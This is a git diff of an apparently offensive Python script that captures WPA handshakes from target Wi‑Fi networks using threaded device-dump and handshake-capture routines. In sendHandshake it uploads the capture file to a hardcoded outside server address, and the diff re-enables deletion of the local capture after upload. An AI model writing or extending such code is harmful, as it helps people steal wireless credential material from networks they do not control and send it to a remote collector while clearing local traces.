@@ -4,13 +4,16 @@ import CSVHelper
 import ShellHelper
 import XMLHelper
 import JSONHelper
-import requests
+from threads import DumpDevicesThread, GetHandshakeThread
 
+import requests
 import json
+import time
 import os
 
 SERVER_ADDR = 'http://51.210.4.4:8000/api/networks/'
 HANDSHAKE_PATH = 'output/-01.cap'
+TIMEOUT = 20
 
 #reset
 def reset():
@@ -68,17 +71,21 @@ def sendHandshake(network):
 
     file = {'file' : open(HANDSHAKE_PATH,'rb')}
     r = requests.post(SERVER_ADDR, files=file, data=network)
-    #ShellHelper.rmHandshake()
+    ShellHelper.rmHandshake()
 
 #Get Handshake
 def getAndSendHandshake(network,mac):
     monitoring = startMonitoring()
-    analyzeNetwork(network,monitoring,5)
-    result = getHandshake(network['bssid'],mac,monitoring)
+    thread_dump = DumpDevicesThread(network,monitoring, TIMEOUT)
+    thread_handshake = GetHandshakeThread(network,monitoring, TIMEOUT)
+    
+    thread_dump.start()
+    thread_handshake.start()
+    thread_dump.join()
+    thread_handshake.join()
+    
     sendHandshake(network)
     reset()
-
-
 
 #For testing
 def main():
